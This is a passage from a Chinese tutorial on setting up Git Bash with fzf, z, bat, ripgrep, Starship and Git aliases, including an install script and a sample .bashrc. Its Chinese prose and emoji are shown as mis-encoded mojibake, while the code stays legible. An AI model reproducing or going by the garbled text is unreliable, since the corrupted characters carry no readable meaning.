<h4 data-id="heading-70">å¿…è£…å·¥å…·ï¼ˆ5 é€‰ 3ï¼‰</h4>
<h5 data-id="heading-71">ğŸ¥‡ fzf â­â­â­â­â­</h5>
<p><strong>è¿™æ˜¯ä»€ä¹ˆï¼Ÿ</strong> æ¨¡ç³Šæœç´¢ç¥å™¨ï¼Œè®©ä½ å¿«é€Ÿæ‰¾åˆ°å†å²å‘½ä»¤å’Œæ–‡ä»¶ã€‚</p>
<p><strong>æ•ˆæœæ¼”ç¤ºï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŒ‰ Ctrl+R â†’ è¾“å…¥ "git push" â†’ ç«‹å³æ‰¾åˆ°æ‰€æœ‰ç›¸å…³å†å²å‘½ä»¤</span>
<span class="hljs-comment"># æŒ‰ Ctrl+T â†’ è¾“å…¥ "readme" â†’ å¿«é€Ÿå®šä½åˆ° README.md</span>
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆå¿…è£…ï¼Ÿ</strong></p>
<ul>
<li>ğŸ“œ å†å²å‘½ä»¤å¤ªå¤šï¼Œè®°ä¸ä½ï¼Ÿâ†’ fzf ç§’æ‰¾</li>
<li>ğŸ“ æ–‡ä»¶è·¯å¾„å¤ªæ·±ï¼Œæ‡’å¾— cdï¼Ÿâ†’ fzf ç›´è¾¾</li>
<li>âš¡ æ•ˆç‡æå‡ï¼šä» 30 ç§’æ‰¾æ–‡ä»¶ â†’ 3 ç§’æå®š</li>
</ul>
<p><strong>å®‰è£…æ–¹å¼ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Git Bash ä¸­æ‰§è¡Œ</span>
git <span class="hljs-built_in">clone</span> --depth 1 https://github.com/junegunn/fzf.git ~/.fzf
~/.fzf/install
<span class="hljs-comment"># å…¨é€‰ y å³å¯</span>
</code></pre>
<hr/>
<h5 data-id="heading-72">ğŸ¥ˆ Git åˆ«å â­â­â­â­â­</h5>
<p><strong>è¿™æ˜¯ä»€ä¹ˆï¼Ÿ</strong> ç”¨çŸ­å‘½ä»¤ä»£æ›¿é•¿å‘½ä»¤ã€‚</p>
<p><strong>å¯¹æ¯”æ•ˆæœï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ²¡æœ‰åˆ«åï¼ˆç´¯ï¼‰</span>
git status
git add --all
git commit -m <span class="hljs-string">"fix bug"</span>
git push origin main

<span class="hljs-comment"># æœ‰åˆ«åï¼ˆçˆ½ï¼‰</span>
gst
gaa
gcm <span class="hljs-string">"fix bug"</span>
gp
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆå¿…è£…ï¼Ÿ</strong> æ¯å¤©æ•²å‡ åæ¬¡ Git å‘½ä»¤ï¼Œèƒ½çœä¸€åŠæ—¶é—´ï¼</p>
<p><strong>å®‰è£…æ–¹å¼ï¼š</strong> åœ¨ <code>~/.bashrc</code> ä¸­æ·»åŠ ï¼ˆè§ä¸Šé¢é…ç½®ï¼‰</p>
<hr/>
<h5 data-id="heading-73">ğŸ¥‰ zï¼ˆç›®å½•è·³è½¬ï¼‰â­â­â­â­</h5>
<p><strong>è¿™æ˜¯ä»€ä¹ˆï¼Ÿ</strong> æ™ºèƒ½è®°å½•ä½ è®¿é—®è¿‡çš„ç›®å½•ï¼Œä¸€é”®è·³è½¬ã€‚</p>
<p><strong>å¯¹æ¯”æ•ˆæœï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ²¡æœ‰ zï¼ˆéº»çƒ¦ï¼‰</span>
<span class="hljs-built_in">cd</span> /c/Users/MyName/Documents/Projects/MyProject/src/components

<span class="hljs-comment"># æœ‰ zï¼ˆç®€å•ï¼‰</span>
z comp  <span class="hljs-comment"># ç›´æ¥è·³åˆ° components ç›®å½•</span>
</code></pre>
<p><strong>åŸç†ï¼š</strong> z ä¼šè®°å½•ä½ è®¿é—®ç›®å½•çš„é¢‘ç‡ï¼Œè¾“å…¥éƒ¨åˆ†ç›®å½•åå°±èƒ½è·³è½¬ã€‚</p>
<p><strong>å®‰è£…æ–¹å¼ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">curl -fsSL https://raw.githubusercontent.com/rupa/z/master/z.sh -o ~/z.sh
<span class="hljs-built_in">echo</span> <span class="hljs-string">"source ~/z.sh"</span> &gt;&gt; ~/.bashrc
</code></pre>
<hr/>
<h4 data-id="heading-74">é”¦ä¸Šæ·»èŠ±å·¥å…·ï¼ˆæŒ‰éœ€å®‰è£…ï¼‰</h4>
<h5 data-id="heading-75">bat â­â­â­â­</h5>
<p><strong>è¿™æ˜¯ä»€ä¹ˆï¼Ÿ</strong> å¢å¼ºç‰ˆ catï¼ŒæŸ¥çœ‹æ–‡ä»¶å†…å®¹æ—¶å¸¦è¯­æ³•é«˜äº®å’Œè¡Œå·ã€‚</p>
<p><strong>å¯¹æ¯”ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åŸç‰ˆ cat</span>
<span class="hljs-built_in">cat</span> index.js  <span class="hljs-comment"># çº¯é»‘ç™½æ–‡æœ¬</span>

<span class="hljs-comment"># bat</span>
bat index.js  <span class="hljs-comment"># å½©è‰²é«˜äº® + è¡Œå· + æ›´ç¾è§‚</span>
</code></pre>
<p><strong>å®‰è£…ï¼š</strong> <code>scoop install bat</code> æˆ–æ‰‹åŠ¨ä¸‹è½½</p>
<hr/>
<h5 data-id="heading-76">ripgrep (rg) â­â­â­â­</h5>
<p><strong>è¿™æ˜¯ä»€ä¹ˆï¼Ÿ</strong> è¶…å¿«é€Ÿæœç´¢æ–‡ä»¶å†…å®¹ï¼ˆæ¯” grep å¿« 10 å€ï¼‰ã€‚</p>
<p><strong>ä½¿ç”¨ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">rg <span class="hljs-string">"TODO"</span>              <span class="hljs-comment"># æœç´¢æ‰€æœ‰æ–‡ä»¶ä¸­çš„ TODO</span>
rg <span class="hljs-string">"function"</span> -t js    <span class="hljs-comment"># åªæœç´¢ JS æ–‡ä»¶</span>
rg -i <span class="hljs-string">"error"</span>          <span class="hljs-comment"># ä¸åŒºåˆ†å¤§å°å†™</span>
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆæ¨èï¼Ÿ</strong> åœ¨å¤§å‹é¡¹ç›®ä¸­æœç´¢ä»£ç ï¼Œé€Ÿåº¦å¿«åˆ°é£èµ·ã€‚</p>
<p><strong>å®‰è£…ï¼š</strong> <code>scoop install ripgrep</code></p>
<hr/>
<h5 data-id="heading-77">Starship Prompt â­â­â­â­â­</h5>
<p><strong>è¿™æ˜¯ä»€ä¹ˆï¼Ÿ</strong> è¶…çº§å¼ºå¤§çš„å‘½ä»¤è¡Œç¾åŒ–å·¥å…·ã€‚</p>
<p><strong>æ•ˆæœï¼š</strong></p>
<pre><code class="hljs language-ruby" lang="ruby">é»˜è®¤æç¤ºç¬¦ï¼š
user<span class="hljs-variable">@PC</span> <span class="hljs-variable constant_">MINGW64</span> ~<span class="hljs-regexp">/project (main)
$

Starship æç¤ºç¬¦ï¼š
~/project</span> on  main [!<span class="hljs-string">?]</span> via  v18.<span class="hljs-number">0.0</span> 
â¯
</code></pre>
<p>èƒ½æ˜¾ç¤ºï¼šGit çŠ¶æ€ã€è¯­è¨€ç‰ˆæœ¬ã€æ‰§è¡Œæ—¶é—´ç­‰</p>
<p><strong>å®‰è£…ï¼š</strong> <code>scoop install starship</code></p>
<hr/>
<h5 data-id="heading-78">fd â­â­â­</h5>
<p><strong>è¿™æ˜¯ä»€ä¹ˆï¼Ÿ</strong> æ›´å‹å¥½çš„ find å‘½ä»¤ã€‚</p>
<p><strong>å¯¹æ¯”ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># findï¼ˆå¤æ‚ï¼‰</span>
find . -name <span class="hljs-string">"*.js"</span> -<span class="hljs-built_in">type</span> f

<span class="hljs-comment"># fdï¼ˆç®€å•ï¼‰</span>
fd -e js
</code></pre>
<p><strong>å®‰è£…ï¼š</strong> <code>scoop install fd</code></p>
<hr/>
<h5 data-id="heading-79">tldr â­â­â­</h5>
<p><strong>è¿™æ˜¯ä»€ä¹ˆï¼Ÿ</strong> ç®€åŒ–ç‰ˆå¸®åŠ©æ–‡æ¡£ï¼Œç›´æ¥ç»™ä¾‹å­ã€‚</p>
<p><strong>å¯¹æ¯”ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">man tar  <span class="hljs-comment"># ä¸€å¤§å †è¯´æ˜ï¼Œçœ‹ä¸æ‡‚</span>

tldr tar <span class="hljs-comment"># ç›´æ¥ç»™å¸¸ç”¨ä¾‹å­ï¼š</span>
         <span class="hljs-comment"># å‹ç¼©ï¼štar -czf file.tar.gz folder/</span>
         <span class="hljs-comment"># è§£å‹ï¼štar -xzf file.tar.gz</span>
</code></pre>
<p><strong>å®‰è£…ï¼š</strong> <code>npm install -g tldr</code>ï¼ˆéœ€è¦ Node.jsï¼‰</p>
<hr/>
<h3 data-id="heading-80">2.2 ä¸€é”®å®‰è£…è„šæœ¬</h3>
<p>å°†ä»¥ä¸‹å†…å®¹ä¿å­˜ä¸º <code>setup_gitbash.sh</code>ï¼Œåœ¨ Git Bash ä¸­æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># Git Bash å¢å¼ºå·¥å…·ä¸€é”®å®‰è£…è„šæœ¬</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"===== Git Bash å¢å¼ºå·¥å…·å®‰è£…å¼€å§‹ ====="</span>

<span class="hljs-comment"># å¤‡ä»½ç°æœ‰é…ç½®</span>
<span class="hljs-keyword">if</span> [ -f ~/.bashrc ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">cp</span> ~/.bashrc ~/.bashrc.backup.$(<span class="hljs-built_in">date</span> +%Y%m%d_%H%M%S)
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"âœ“ å·²å¤‡ä»½ .bashrc"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># å®‰è£… bash-git-prompt</span>
<span class="hljs-keyword">if</span> [ ! -d ~/.bash-git-prompt ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"æ­£åœ¨å®‰è£… bash-git-prompt..."</span>
    git <span class="hljs-built_in">clone</span> https://github.com/magicmonty/bash-git-prompt.git ~/.bash-git-prompt --depth=1
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"âœ“ bash-git-prompt å®‰è£…å®Œæˆ"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># å®‰è£… fzf</span>
<span class="hljs-keyword">if</span> [ ! -d ~/.fzf ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"æ­£åœ¨å®‰è£… fzf..."</span>
    git <span class="hljs-built_in">clone</span> --depth 1 https://github.com/junegunn/fzf.git ~/.fzf
    ~/.fzf/install --all
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"âœ“ fzf å®‰è£…å®Œæˆ"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># å®‰è£… z</span>
<span class="hljs-keyword">if</span> [ ! -f ~/z.sh ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"æ­£åœ¨å®‰è£… z..."</span>
    curl -fsSL https://raw.githubusercontent.com/rupa/z/master/z.sh -o ~/z.sh
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"âœ“ z å®‰è£…å®Œæˆ"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># é…ç½® ~/.bashrc</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"æ­£åœ¨é…ç½® ~/.bashrc..."</span>
<span class="hljs-built_in">cat</span> &gt;&gt; ~/.bashrc &lt;&lt; <span class="hljs-string">'EOF'</span>

<span class="hljs-comment"># ===== Git Bash å¢å¼ºé…ç½® =====</span>

<span class="hljs-comment"># bash-git-prompt</span>
<span class="hljs-keyword">if</span> [ -f <span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.bash-git-prompt/gitprompt.sh"</span> ]; <span class="hljs-keyword">then</span>
    GIT_PROMPT_ONLY_IN_REPO=1
    <span class="hljs-built_in">source</span> <span class="hljs-variable">$HOME</span>/.bash-git-prompt/gitprompt.sh
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># z - å¿«é€Ÿç›®å½•è·³è½¬</span>
[ -f ~/z.sh ] &amp;&amp; <span class="hljs-built_in">source</span> ~/z.sh

<span class="hljs-comment"># fzf</span>
[ -f ~/.fzf.bash ] &amp;&amp; <span class="hljs-built_in">source</span> ~/.fzf.bash

<span class="hljs-comment"># Git åˆ«å</span>
<span class="hljs-built_in">alias</span> gst=<span class="hljs-string">'git status'</span>
<span class="hljs-built_in">alias</span> gco=<span class="hljs-string">'git checkout'</span>
<span class="hljs-built_in">alias</span> gcb=<span class="hljs-string">'git checkout -b'</span>
<span class="hljs-built_in">alias</span> gaa=<span class="hljs-string">'git add --all'</span>
<span class="hljs-built_in">alias</span> gcm=<span class="hljs-string">'git commit -m'</span>
<span class="hljs-built_in">alias</span> gp=<span class="hljs-string">'git push'</span>
<span class="hljs-built_in">alias</span> gl=<span class="hljs-string">'git pull'</span>
<span class="hljs-built_in">alias</span> gbr=<span class="hljs-string">'git branch'</span>
<span class="hljs-built_in">alias</span> glog=<span class="hljs-string">'git log --oneline --graph --decorate --all'</span>

<span class="hljs-comment"># å¸¸ç”¨åˆ«å</span>
<span class="hljs-built_in">alias</span> ll=<span class="hljs-string">'ls -lah'</span>
<span class="hljs-built_in">alias</span> la=<span class="hljs-string">'ls -A'</span>
<span class="hljs-built_in">alias</span> cls=<span class="hljs-string">'clear'</span>
<span class="hljs-built_in">alias</span> ..=<span class="hljs-string">'cd ..'</span>
<span class="hljs-built_in">alias</span> ...=<span class="hljs-string">'cd ../..'</span>

<span class="hljs-comment"># å·¥å…·åˆ«åï¼ˆå¦‚æœå·²å®‰è£…ï¼‰</span>
<span class="hljs-built_in">command</span> -v bat &amp;&gt; /dev/null &amp;&amp; <span class="hljs-built_in">alias</span> <span class="hljs-built_in">cat</span>=<span class="hljs-string">'bat'</span>
<span class="hljs-built_in">command</span> -v fd &amp;&gt; /dev/null &amp;&amp; <span class="hljs-built_in">alias</span> find=<span class="hljs-string">'fd'</span>
<span class="hljs-built_in">command</span> -v rg &amp;&gt; /dev/null &amp;&amp; <span class="hljs-built_in">alias</span> grep=<span class="hljs-string">'rg'</span>

<span class="hljs-comment"># å†å²è®°å½•ä¼˜åŒ–</span>
<span class="hljs-built_in">export</span> HISTSIZE=10000
<span class="hljs-built_in">export</span> HISTFILESIZE=20000
<span class="hljs-built_in">export</span> HISTCONTROL=ignoreboth:erasedups

<span class="hljs-comment"># å½©è‰²è¾“å‡º</span>
<span class="hljs-built_in">export</span> CLICOLOR=1
<span class="hljs-built_in">export</span> LSCOLORS=GxFxCxDxBxegedabagaced

<span class="hljs-built_in">echo</span> <span class="hljs-string">"âœ“ Git Bash å¢å¼ºé…ç½®åŠ è½½å®Œæˆ"</span>
EOF

<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"===== å®‰è£…å®Œæˆ ====="</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"ğŸ“¦ å¯é€‰å·¥å…·ï¼ˆéœ€æ‰‹åŠ¨ä¸‹è½½ï¼‰ï¼š"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"  1. bat: https://github.com/sharkdp/bat/releases"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"  2. ripgrep: https://github.com/BurntSushi/ripgrep/releases"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"  3. fd: https://github.com/sharkdp/fd/releases"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"  4. starship: https://starship.rs/"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"ğŸ“¥ ä¸‹è½½åå°† .exe æ–‡ä»¶å¤åˆ¶åˆ°: C:\\Program Files\\Git\\usr\\bin\\"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"ğŸ”„ æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ä½¿é…ç½®ç”Ÿæ•ˆï¼š"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"    source ~/.bashrc"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"ğŸ’¡ æˆ–æ¨èä½¿ç”¨ scoop åŒ…ç®¡ç†å™¨ä¸€é”®å®‰è£…ï¼š"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"    scoop install bat ripgrep fd starship"</span>
</code></pre>
<h4 data-id="heading-81">ä½¿ç”¨æ–¹æ³•</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. ä¿å­˜ä¸Šé¢çš„è„šæœ¬ä¸º setup_gitbash.sh</span>

<span class="hljs-comment"># 2. åœ¨ Git Bash ä¸­æ‰§è¡Œ</span>
bash setup_gitbash.sh

<span class="hljs-comment"># 3. é‡æ–°åŠ è½½é…ç½®</span>
<span class="hljs-built_in">source</span> ~/.bashrc
</code></pre>
<hr/>
<h3 data-id="heading-82">2.3 å®Œæ•´é…ç½®ç¤ºä¾‹</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ~/.bashrc - Git Bash å®Œæ•´é…ç½®ç¤ºä¾‹</span>

<span class="hljs-comment"># ===== åŸºç¡€è®¾ç½® =====</span>
<span class="hljs-built_in">export</span> LANG=zh_CN.UTF-8
<span class="hljs-built_in">export</span> EDITOR=vim

<span class="hljs-comment"># å†å²è®°å½•ä¼˜åŒ–</span>
<span class="hljs-built_in">export</span> HISTSIZE=10000
<span class="hljs-built_in">export</span> HISTFILESIZE=20000
<span class="hljs-built_in">export</span> HISTCONTROL=ignoreboth:erasedups
<span class="hljs-built_in">shopt</span> -s histappend

<span class="hljs-comment"># ===== å¤–è§‚ç¾åŒ– =====</span>

<span class="hljs-comment"># æ–¹æ¡ˆä¸€ï¼šbash-git-promptï¼ˆè½»é‡ï¼‰</span>
<span class="hljs-keyword">if</span> [ -f <span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.bash-git-prompt/gitprompt.sh"</span> ]; <span class="hljs-keyword">then</span>
    GIT_PROMPT_ONLY_IN_REPO=1
    <span class="hljs-built_in">source</span> <span class="hljs-variable">$HOME</span>/.bash-git-prompt/gitprompt.sh
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># æ–¹æ¡ˆäºŒï¼šStarshipï¼ˆæ¨èï¼ŒåŠŸèƒ½å¼ºå¤§ï¼‰</span>
<span class="hljs-comment"># if command -v starship &amp;&gt; /dev/null; then</span>
<span class="hljs-comment">#     eval "$(starship init bash)"</span>
<span class="hljs-comment"># fi</span>

<span class="hljs-comment"># å½©è‰²è¾“å‡º</span>
<span class="hljs-built_in">export</span> CLICOLOR=1
<span class="hljs-built_in">export</span> LSCOLORS=GxFxCxDxBxegedabagaced
<span class="hljs-built_in">alias</span> <span class="hljs-built_in">ls</span>=<span class="hljs-string">'ls --color=auto'</span>
<span class="hljs-built_in">alias</span> grep=<span class="hljs-string">'grep --color=auto'</span>

<span class="hljs-comment"># ===== å·¥å…·åŠ è½½ =====</span>

<span class="hljs-comment"># z - ç›®å½•è·³è½¬</span>
[ -f ~/z.sh ] &amp;&amp; <span class="hljs-built_in">source</span> ~/z.sh

<span class="hljs-comment"># fzf - æ¨¡ç³Šæœç´¢</span>
[ -f ~/.fzf.bash ] &amp;&amp; <span class="hljs-built_in">source</span> ~/.fzf.bash

<span class="hljs-comment"># ===== Git åˆ«å =====</span>
<span class="hljs-built_in">alias</span> gst=<span class="hljs-string">'git status'</span>
<span class="hljs-built_in">alias</span> gco=<span class="hljs-string">'git checkout'</span>
<span class="hljs-built_in">alias</span> gcb=<span class="hljs-string">'git checkout -b'</span>
<span class="hljs-built_in">alias</span> gaa=<span class="hljs-string">'git add --all'</span>
<span class="hljs-built_in">alias</span> gcm=<span class="hljs-string">'git commit -m'</span>
<span class="hljs-built_in">alias</span> gca=<span class="hljs-string">'git commit --amend'</span>
<span class="hljs-built_in">alias</span> gp=<span class="hljs-string">'git push'</span>
<span class="hljs-built_in">alias</span> gpl=<span class="hljs-string">'git pull'</span>
<span class="hljs-built_in">alias</span> gpf=<span class="hljs-string">'git push --force-with-lease'</span>
<span class="hljs-built_in">alias</span> gbr=<span class="hljs-string">'git branch'</span>
<span class="hljs-built_in">alias</span> gbd=<span class="hljs-string">'git branch -d'</span>
<span class="hljs-built_in">alias</span> glog=<span class="hljs-string">'git log --oneline --graph --decorate --all'</span>
<span class="hljs-built_in">alias</span> gdiff=<span class="hljs-string">'git diff'</span>
<span class="hljs-built_in">alias</span> gstash=<span class="hljs-string">'git stash'</span>
<span class="hljs-built_in">alias</span> gpop=<span class="hljs-string">'git stash pop'</span>

<span class="hljs-comment"># ===== å¸¸ç”¨åˆ«å =====</span>
<span class="hljs-built_in">alias</span> ll=<span class="hljs-string">'ls -lah'</span>
<span class="hljs-built_in">alias</span> la=<span class="hljs-string">'ls -A'</span>
<span class="hljs-built_in">alias</span> l=<span class="hljs-string">'ls -CF'</span>
<span class="hljs-built_in">alias</span> cls=<span class="hljs-string">'clear'</span>
<span class="hljs-built_in">alias</span> c=<span class="hljs-string">'clear'</span>

<span class="hljs-comment"># ç›®å½•å¯¼èˆª</span>
<span class="hljs-built_in">alias</span> ..=<span class="hljs-string">'cd ..'</span>
<span class="hljs-built_in">alias</span> ...=<span class="hljs-string">'cd ../..'</span>
<span class="hljs-built_in">alias</span> ....=<span class="hljs-string">'cd ../../..'</span>
<span class="hljs-built_in">alias</span> ~=<span class="hljs-string">'cd ~'</span>
<span class="hljs-built_in">alias</span> -- -=<span class="hljs-string">'cd -'</span>

<span class="hljs-comment"># å®‰å…¨æ“ä½œ</span>
<span class="hljs-built_in">alias</span> <span class="hljs-built_in">rm</span>=<span class="hljs-string">'rm -i'</span>
<span class="hljs-built_in">alias</span> <span class="hljs-built_in">cp</span>=<span class="hljs-string">'cp -i'</span>
<span class="hljs-built_in">alias</span> <span class="hljs-built_in">mv</span>=<span class="hljs-string">'mv -i'</span>

<span class="hljs-comment"># å·¥å…·æ›¿ä»£</span>
<span class="hljs-built_in">command</span> -v bat &amp;&gt; /dev/null &amp;&amp; <span class="hljs-built_in">alias</span> <span class="hljs-built_in">cat</span>=<span class="hljs-string">'bat'</span>
<span class="hljs-built_in">command</span> -v fd &amp;&gt; /dev/null &amp;&amp; <span class="hljs-built_in">alias</span> find=<span class="hljs-string">'fd'</span>
<span class="hljs-built_in">command</span> -v rg &amp;&gt; /dev/null &amp;&amp; <span class="hljs-built_in">alias</span> grep=<span class="hljs-string">'rg'</span>

<span class="hljs-comment"># ===== è‡ªå®šä¹‰å‡½æ•° =====</span>

<span class="hljs-comment"># åˆ›å»ºç›®å½•å¹¶è¿›å…¥</span>
<span class="hljs-function"><span class="hljs-title">mkcd</span></span>() {
    <span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span> &amp;&amp; <span class="hljs-built_in">cd</span> <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>
}

<span class="hljs-comment"># è§£å‹ä»»æ„æ ¼å¼æ–‡ä»¶</span>
<span class="hljs-function"><span class="hljs-title">extract</span></span>() {
    <span class="hljs-keyword">if</span> [ -f <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span> ]; <span class="hljs-keyword">then</span>
        <span class="hljs-keyword">case</span> <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span> <span class="hljs-keyword">in</span>
            *.tar.bz2)   tar xjf <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>    ;;
            *.tar.gz)    tar xzf <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>    ;;
            *.bz2)       bunzip2 <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>    ;;
            *.rar)       unrar x <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>    ;;
            *.gz)        gunzip <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>     ;;
            *.tar)       tar xf <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>     ;;
            *.tbz2)      tar xjf <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>    ;;
            *.tgz)       tar xzf <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>    ;;
            *.zip)       unzip <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>      ;;
            *.Z)         uncompress <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span> ;;
            *.7z)        7z x <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>       ;;
            *)           <span class="hljs-built_in">echo</span> <span class="hljs-string">"'<span class="hljs-variable">$1</span>' æ— æ³•è§£å‹"</span> ;;
        <span class="hljs-keyword">esac</span>
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"'<span class="hljs-variable">$1</span>' ä¸æ˜¯æœ‰æ•ˆæ–‡ä»¶"</span>
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># æŸ¥æ‰¾å¤§æ–‡ä»¶</span>
<span class="hljs-function"><span class="hljs-title">bigfiles</span></span>() {
    <span class="hljs-built_in">du</span> -h --max-depth=1 | <span class="hljs-built_in">sort</span> -hr | <span class="hljs-built_in">head</span> -n 20
}

<span class="hljs-comment"># å¿«é€Ÿæœç´¢è¿›ç¨‹</span>
<span class="hljs-function"><span class="hljs-title">psgrep</span></span>() {
    ps aux | grep -v grep | grep -i -e VSZ -e <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>
}

<span class="hljs-comment"># å¿«é€Ÿç¼–è¾‘é…ç½®</span>
<span class="hljs-built_in">alias</span> editbash=<span class="hljs-string">'vim ~/.bashrc'</span>
<span class="hljs-built_in">alias</span> sourcebash=<span class="hljs-string">'source ~/.bashrc'</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"âœ“ Git Bash é…ç½®åŠ è½½å®Œæˆ"</span>
</code></pre>
<hr/>
<h3 data-id="heading-83">2.4 æ–¹æ¡ˆé€‰æ‹©å¯¹æ¯”</h3>
<h4 data-id="heading-84">2.4.1 ä¸‰ç§æ–¹æ¡ˆå¯¹æ¯”</h4>





















































<table><thead><tr><th>ç‰¹æ€§</th><th>Git Bash åŸç”Ÿ</th><th>Git Bash + Zsh</th><th>WSL + Zsh</th></tr></thead><tbody><tr><td><strong>å®‰è£…éš¾åº¦</strong></td><td>â­ ç®€å•</td><td>â­â­â­ ä¸­ç­‰</td><td>â­â­ ç®€å•</td></tr><tr><td><strong>æ’ä»¶ç”Ÿæ€</strong></td><td>â­â­ æœ‰é™</td><td>â­â­â­â­â­ ä¸°å¯Œ</td><td>â­â­â­â­â­ ä¸°å¯Œ</td></tr><tr><td><strong>è¿è¡Œæ€§èƒ½</strong></td><td>â­â­â­ ä¸€èˆ¬</td><td>â­â­â­ ä¸€èˆ¬</td><td>â­â­â­â­ è‰¯å¥½</td></tr><tr><td><strong>ç³»ç»Ÿé›†æˆ</strong></td><td>â­â­â­â­â­ å®Œç¾</td><td>â­â­â­â­ è‰¯å¥½</td><td>â­â­â­ ä¸€èˆ¬</td></tr><tr><td><strong>å­¦ä¹ æˆæœ¬</strong></td><td>â­ ä½</td><td>â­â­â­ ä¸­ç­‰</td><td>â­â­ è¾ƒä½</td></tr><tr><td><strong>ç¨³å®šæ€§</strong></td><td>â­â­â­â­â­ ç¨³å®š</td><td>â­â­â­ ä¸€èˆ¬</td><td>â­â­â­â­ ç¨³å®š</td></tr><tr><td><strong>æ¨èåœºæ™¯</strong></td><td>è½»åº¦ä½¿ç”¨</td><td>é‡åº¦ä½¿ç”¨</td><td>å¼€å‘é¦–é€‰</td></tr></tbody></table>
<h4 data-id="heading-85">2.4.2 é€‰æ‹©å»ºè®®</h4>
<h5 data-id="heading-86">ğŸ’¼ è½»åº¦ç”¨æˆ·ï¼ˆGit + åŸºç¡€å‘½ä»¤ï¼‰</h5>
<p><strong>æ¨èæ–¹æ¡ˆ</strong>ï¼šGit Bash åŸç”Ÿ + åŸºç¡€å·¥å…·</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æœ€å°åŒ–å®‰è£…</span>
âœ“ fzf          <span class="hljs-comment"># æ¨¡ç³Šæœç´¢</span>
âœ“ z            <span class="hljs-comment"># ç›®å½•è·³è½¬</span>
âœ“ bat          <span class="hljs-comment"># è¯­æ³•é«˜äº®</span>
âœ“ Git åˆ«å     <span class="hljs-comment"># å¿«æ·å‘½ä»¤</span>
</code></pre>
<h5 data-id="heading-87">ğŸš€ ä¸­åº¦ç”¨æˆ·ï¼ˆæ—¥å¸¸å¼€å‘ï¼‰</h5>
<p><strong>æ¨èæ–¹æ¡ˆ</strong>ï¼šWSL + Zsh + Oh My Zsh</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®Œæ•´å¼€å‘ç¯å¢ƒ</span>
âœ“ å®Œæ•´çš„ Linux ç¯å¢ƒ
âœ“ ä¸°å¯Œçš„æ’ä»¶ç”Ÿæ€
